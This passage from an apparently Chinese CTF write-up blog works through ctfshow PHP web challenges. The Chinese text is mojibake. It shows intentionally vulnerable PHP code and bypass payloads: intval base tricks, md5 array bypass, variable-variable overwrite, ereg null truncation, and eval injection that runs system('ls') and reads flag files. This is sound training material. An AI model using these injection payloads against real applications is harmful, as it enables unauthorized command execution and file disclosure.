class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>æ–¹æ³•ä¸€ï¼šè¿›åˆ¶è½¬æ¢</p><ul><li>è‹¥numå‰ç¼€ä¸º0ï¼Œå³åˆ¤æ–­numä¸ºå…«è¿›åˆ¶ï¼Œè‹¥numå‰ç¼€ä¸º0xï¼Œåˆ™åˆ¤æ–­numä¸ºåå…­è¿›åˆ¶</li></ul><blockquote><p>è½¬åŒ–ä¸ºå…«è¿›åˆ¶ä¸º010574</p><p>è½¬åŒ–ä¸ºåå…­è¿›åˆ¶ä¸º0x117c</p></blockquote>  <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// <span class="number">16</span></span><br><span class="line">?num=<span class="number">0</span>x117c</span><br><span class="line">// <span class="number">8</span></span><br><span class="line">?num=<span class="number">010574</span></span><br><span class="line">// <span class="number">2</span></span><br><span class="line">?num=<span class="number">0</span>b1000101111100</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>æ–¹æ³•äºŒï¼šç§‘å­¦è®¡æ•°æ³•</p><blockquote><p>4476e3è¡¨ç¤º4476*10^3ï¼Œä¹Ÿå°±æ˜¯4476000ï¼Œ</p><p>è€Œ4476e3åšä¸ºå‚æ•°ä¼ å…¥çš„æ—¶å€™å¯ä»¥å½“æˆå­—ç¬¦ä¸²ï¼Œåœ¨è¿›è¡Œç¬¬ä¸€ä¸ªï¼ˆ&#x3D;&#x3D;&#x3D;ï¼‰æ¯”è¾ƒæ—¶ä¼šå…ˆè½¬ä¸º4476000å†æ¯”è¾ƒï¼Œåˆ°intvalå‡½æ•°æ—¶ï¼Œå› ä¸ºæ²¡æœ‰ç‰¹å¾å‰ç¼€ï¼Œæ‰€ä»¥å½“åè¿›åˆ¶å¤„ç†ï¼Œè€Œintvalå‡½æ•°ä¸èƒ½å¤„ç†ç§‘å­¦è®¡æ•°æ³•ï¼Œ4476e3ä¼šè¢«è¯†åˆ«ä¸º4476,</p></blockquote></li><li><p>æ–¹æ³•ä¸‰ï¼šå­—ç¬¦ä¸²æˆªå–</p><ul><li>intvalå¤„ç†å¼€å¤´æ˜¯æ•°å­—çš„å­—ç¬¦ä¸²æ—¶ï¼Œè¿”å›å€¼ä¸ºå¼€å¤´çš„æ•°ã€‚ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥è¾“å…¥ <strong>?num&#x3D;4476a</strong></li></ul></li><li><p>æ–¹æ³•å››ï¼šæµ®ç‚¹æ•°</p><ul><li><p>æ„é€ æµ®ç‚¹æ•°ç»•è¿‡å³å¯</p><p><em>4476.0</em></p></li></ul></li><li><p>æ–¹æ³•äº”ï¼šä½¿ç”¨æ­£å·ç»•è¿‡</p><p>+010574 </p><p>%2b010574</p></li></ul><h4><span id="web91">web91</span></h4><ul><li><p><a href="https://blog.csdn.net/qq_46091464/article/details/108278486">æ¢è¡Œè§£ææ¼æ´</a></p><blockquote><p>^è¡¨ç¤ºè¡¨è¾¾å¼å¼€å¤´ï¼Œ$è¡¨ç¤ºè¡¨è¾¾å¼ç»“å°¾ï¼Œiè¡¨ç¤ºä¸åŒºåˆ†å¤§å°å†™ï¼Œmè¡¨ç¤ºå¤šè¡Œæ¨¡å¼</p><p>\næ¢è¡Œï¼Œæˆ‘ä»¬ä»…éœ€ç”¨%0aä»£æ›¿å³å¯</p></blockquote></li></ul><h4><span id="web93">web93</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>è¿‡æ»¤äº†åå…­è¿›åˆ¶ï¼Œæˆ‘ä»¬åˆ©ç”¨å…«è¿›åˆ¶å°±å¯ä»¥<strong>010574</strong></li></ul><h4><span id="web94">web94</span></h4><ul><li><p>è¿™é¢˜å¢åŠ äº†å¯¹8è¿›åˆ¶çš„å›´è¿½å µæˆªï¼Œæˆ‘ä»¬ç”¨æµ®ç‚¹æ•°ç»•è¿‡</p><p><code>4476.0</code></p></li></ul><h4><span id="web97">web97</span></h4><ul><li>æˆ‘ä¸€å¼€å§‹å†™ä¸ªè„šæœ¬ï¼Œä¸çŸ¥é“è¦è·‘åˆ°ä»€ä¹ˆæ—¶å€™ï¼Œæš´åŠ›å¥½åƒå‡ºä¸æ¥ï¼Œå¯ä»¥æœä¸€ä¸‹ç½‘ä¸Šè®¡ç®—å¥½çš„md5ã€‚</li><li>çŸ¥è¯†ç‚¹ï¼Œmd5å‡½æ•°æ— æ³•æ”¯æŒæ•°ç»„æ“ä½œï¼Œå› æ­¤æ„é€ æ•°ç»„å³å¯<ul><li>a[]&#x3D;1&amp;b[]&#x3D;2</li></ul></li></ul><h4><span id="web99">web99</span></h4><p>in_array()å‡½æ•°æœ‰æ¼æ´ æ²¡æœ‰è®¾ç½®ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œä¸¥æ ¼åŒ¹é…ã€‚å°±å¯ä»¥å½¢æˆè‡ªåŠ¨è½¬æ¢</p><blockquote><p> n&#x3D;1.phpè‡ªåŠ¨è½¬æ¢ä¸º1</p></blockquote><h4><span id="web100">web100</span></h4><p>è¿ç®—ç¬¦ä¼˜å…ˆçº§ï¼š**&amp;&amp; &gt; || &gt; &#x3D; &gt; and &gt; or**</p><p><strong>is_numeric()</strong> å‡½æ•°ç”¨äºæ£€æµ‹å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²ã€‚</p><p>æ˜¯æ•°å­—å’Œæ•°å­—å­—ç¬¦ä¸²åˆ™è¿”å› TRUEï¼Œå¦åˆ™è¿”å› FALSE</p><p>**var_dump()**å‡½æ•°å¯ä»¥è¾“å‡ºå¤šä¸ªå€¼ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>v3çš„è¯è¦åŠ æ³¨é‡Šä¹Ÿè¡Œ,ä¸åŠ ä¹Ÿèƒ½è¿è¡Œ</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?v1=<span class="number">1</span>&amp;v2=var_dump($ctfshow)/*&amp;v3=*/;</span><br><span class="line">?v1=<span class="number">1</span>&amp;v2=var_dump($ctfshow)&amp;v3=;</span><br><span class="line">?v1=<span class="number">1</span>&amp;v2=<span class="built_in">echo</span> new ReflectionClass(&#x27;ctfshow&#x27;)/*&amp;v3=*/;</span><br><span class="line">æˆ–?v1=<span class="number">1</span>&amp;v2=<span class="built_in">echo</span> new ReflectionClass&amp;v3=;</span><br></pre></td></tr></table></figure><h4><span id="web105">web105</span></h4><p><a href="https://blog.csdn.net/m0_62094846/article/details/122529362">è¯¦è§£</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-28 22:34:07</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$error</span>=<span class="string">&#x27;ä½ è¿˜æƒ³è¦flagå˜›ï¼Ÿ&#x27;</span>;</span><br><span class="line"><span class="variable">$suces</span>=<span class="string">&#x27;æ—¢ç„¶ä½ æƒ³è¦é‚£ç»™ä½ å§ï¼&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>===<span class="string">&#x27;error&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;<span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$value</span>===<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;your are good&quot;</span>.<span class="variable">$flag</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="variable">$suces</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">ä½ è¿˜æƒ³è¦flagå˜›ï¼Ÿ</span><br></pre></td></tr></table></figure><blockquote><p>&amp;&amp;åº”ç”¨<br>$hell&#x3D;â€abcâ€;<br>$$hell&#x3D;â€defâ€;ç­‰åŒäº$abc&#x3D;â€defâ€;</p></blockquote><p>è¿™é‡Œçš„&amp;&amp;æŠŠkeyçš„å€¼å˜ä¸ºäº†å˜é‡æ‰€ä»¥å¯ä»¥é€šè¿‡$errorå’Œ$$sucesè¿›è¡Œè¾“å…¥flag</p><p>æˆ‘ä»¬å¯ä»¥åœ¨GETæŠŠflagèµ‹å€¼ç»™suces,ç„¶åå†æŠŠsucesèµ‹å€¼ç»™errorå°±èƒ½æ˜¾ç¤ºflagäº†</p><h4><span id="web108">web108</span></h4><p>ereg()å‡½æ•°ç”¨æŒ‡å®šçš„æ¨¡å¼æœç´¢ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æŒ‡å®šçš„å­—ç¬¦ä¸²,å¦‚æœåŒ¹é…æˆåŠŸè¿”å›true,å¦åˆ™,åˆ™è¿”å›falseã€‚æœç´¢å­— æ¯çš„å­—ç¬¦æ˜¯å¤§å°å†™æ•æ„Ÿçš„ã€‚ eregå‡½æ•°å­˜åœ¨NULLæˆªæ–­æ¼æ´ï¼Œå¯¼è‡´äº†æ­£åˆ™è¿‡æ»¤è¢«ç»•è¿‡,æ‰€ä»¥å¯ä»¥ä½¿ç”¨%00æˆªæ–­æ­£åˆ™åŒ¹é…</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ereg</span> (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])===<span class="literal">FALSE</span>)  &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//åªæœ‰36dçš„äººæ‰èƒ½çœ‹åˆ°flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))==<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4><span id="web109">web109</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>æ–¹æ³•ä¸€ï¼šåå°„</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?v1=Reflectionclass&amp;v2=system(&#x27;ls&#x27;)</span><br><span class="line">?v1=Reflectionclass&amp;v2=system(&#x27;tac fl36dg.txt&#x27;)</span><br></pre></td></tr></table></figure></li><li><p>æ–¹æ³•äºŒï¼šå¼‚å¸¸å¤„ç†</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?v1=Exception&amp;v2=system(&#x27;ls&#x27;)</span><br><span class="line">?v1=Exception&amp;v2=system(&#x27;tac fl36dg.txt&#x27;) </span><br></pre></td></tr></table></figure></li><li><p>æ–¹æ³•ä¸‰ï¼šé”™è¯¯</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?v1=Error&amp;v2=system(&#x27;ls&#x27;)</span><br><span class="line">?v1=Error&amp;v2=system(&#x27;tac fl36dg.txt&#x27;) </span><br></pre></td></tr></table></figure></li></ul><h4><span id="web110">web110</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç¦æ‰äº†åŒ¿åç±»çš„payload</p><p><strong>è¦æ±‚</strong>ï¼šä¸å…è®¸ä½¿ç”¨ç‰¹æ®Šå­—ç¬¦ä¸æ•°å­—</p><p>ã€€ã€€ v1åªèƒ½æ˜¯ç±»ï¼Œv2ä¸ºå‡½æ•°æˆ–æ–¹æ³•ï¼Œä¸”æ— å‚æ•°</p><p><strong>åˆ†æ</strong>ï¼š</p><p> 1ã€web109 ä¸­çš„ v2 å…ˆä¸º system(ls) ï¼Œåä¸ºsystem(â€˜tac fl*â€™)</p><p>ã€€ã€€ã€€ã€€æ­¥éª¤ä¸ºï¼š1ï¼‰æŸ¥çœ‹ç›®å½• 2ï¼‰æŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯</p><p>ã€€ã€€ã€€ã€€ä½† ( è¢«ç¦ç”¨ï¼Œä¸èƒ½ä½¿ç”¨ system(ls) æŸ¥çœ‹ç›®å½•</p><p> 2ã€è€ƒè™‘æŸ¥çœ‹ç›®å½•å‡½æ•°çš„æ›¿ä»£ï¼šscandir()ã€golb()ã€dirname()ã€basename()ã€realpath()ã€getcwd()</p><p>ã€€ã€€ã€€ã€€å…¶ä¸­ scandir()ã€golb() ã€dirname()ã€basename()ã€realpath() éœ€è¦ç»™å®šå‚æ•°</p><p>ã€€ã€€ã€€ã€€è€Œ getcwd() ä¸éœ€è¦å‚æ•°</p><p>ã€€ã€€ã€€ã€€å¾ˆæ˜æ˜¾ v2&#x3D;getcwd</p><p> 3ã€v1 æˆ‘ä»¬é€‰æ‹©è¯»å–æ–‡ä»¶å†…ç½®ç±» FilesystemIterator</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=<span class="built_in">FilesystemIterator</span>&amp;v2=getcwd</span><br></pre></td></tr></table></figure><p>è®¿é—®æ–‡ä»¶å³å¯</p><h4><span id="web111">web111</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;<span class="variable">$v1</span>,&amp;<span class="variable">$v2</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$$v1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">getFlag</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>è¦æ±‚</strong>ï¼šv1ï¼Œv2 